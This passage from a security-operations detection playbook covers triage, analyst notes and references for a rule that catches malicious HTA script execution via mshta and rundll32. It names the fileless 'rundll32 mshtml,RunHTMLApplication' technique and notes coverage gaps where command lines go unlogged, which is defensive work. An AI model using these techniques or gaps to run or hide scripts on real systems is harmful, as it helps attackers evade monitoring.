- **false_positive (authorised):** a recognised local application/installer HTA — matching or resembling the deployed rule's excluded parents, a local path, and **no** remote/obfuscated payload — is positively matched to the exact engine + `$user` + `$host` + time. Record the owner; scope any exception by identity/parent, not a broad rule change.
- **false_positive (blocked-malicious):** the script/HTA was positively proven blocked/failed (no download, no child activity); documented as blocked (never "benign").
- **misconfiguration:** a legitimate application relies on HTA/mshta and was simply not yet baselined/excluded; baseline it and recommend migrating off mshta.
- **true_positive:** malicious HTML-application script execution confirmed (remote/delivered HTA or inline command from a phishing parent); containment/eradication/recovery completed, scope of `$user`/`$host`/peers and the phishing source established, no residual persistence or recurrence.
- **needs_escalation:** handed to Tier 3/IR with the specific evidence gaps (null command line, unrecoverable script/parent) documented.

In all cases: attach the ES|QL used and its results, the entity values, and the classification rationale to the alert before closing.

## 23. Analyst Notes

- **This detection lives or dies by the command line.** The markers are in `process.command_line`/`process.args`, which are only ~50% populated on NBI. Where null, the rule cannot match and the script is invisible in-index — a quiet host is not a safe host; recover the script from EDR/host. Enabling command-line auditing on the interactive/workstation class is the single highest-value hardening ask for this rule.
- **The reused queries concatenate both fields.** `TO_LOWER(CONCAT(COALESCE(process.command_line,""), " ", COALESCE(MV_CONCAT(process.args," "),"")))` surfaces a marker wherever either field is populated — the robust way to read the script on NBI.
- **`rundll32 … mshtml,RunHTMLApplication` is fileless HTA.** No `.hta` file is needed; the `RunHTMLApplication` marker on `rundll32` is as significant as an `.hta` on `mshta`.
- **Parent = initial vector.** Office/browser/mail/explorer parents are the phishing fingerprint; a script-chain parent indicates a multi-stage loader; verify a claimed installer parent against the deployed rule's excluded set (`wfshell.exe`/`MSACCESS.EXE`/`GTInstaller.exe`).
- **Pair with the companion analytic.** This rule catches the script mshta ran; the mshta *child-process* rule catches what it launched — investigate them together when both fire on the same host/user.
- **KB-worthy (persist to NBI customer scope):** (1) mshta zero-baseline and no rundll32 script markers over 4h on `logs-system.security-*`; (2) command-line/`process.args` host-bimodality (~50%) directly caps this rule's coverage; (3) `process.hash.*` absent on 4688. All observed live on 2026-08-19.

## 24. References

- MITRE ATT&CK — System Binary Proxy Execution (T1218): https://attack.mitre.org/techniques/T1218/
- MITRE ATT&CK — System Binary Proxy Execution: Mshta (T1218.005): https://attack.mitre.org/techniques/T1218/005/
- MITRE ATT&CK — System Binary Proxy Execution: Rundll32 (T1218.011): https://attack.mitre.org/techniques/T1218/011/
- MITRE ATT&CK — Defense Evasion tactic (TA0005): https://attack.mitre.org/tactics/TA0005/
- Elastic — prebuilt rule "Mshta Making Network Connections / HTML Application" references: https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/windows/defense_evasion_suspicious_mshta_child_process
- LOLBAS — Mshta.exe: https://lolbas-project.github.io/lolbas/Binaries/Mshta/
- LOLBAS — Rundll32.exe (mshtml,RunHTMLApplication): https://lolbas-project.github.io/lolbas/Binaries/Rundll32/
- Red Canary — Mshta threat detection: https://redcanary.com/threat-detection-report/techniques/mshta/
- Microsoft Learn — Command line process auditing (Event 4688 command-line GPO): https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing
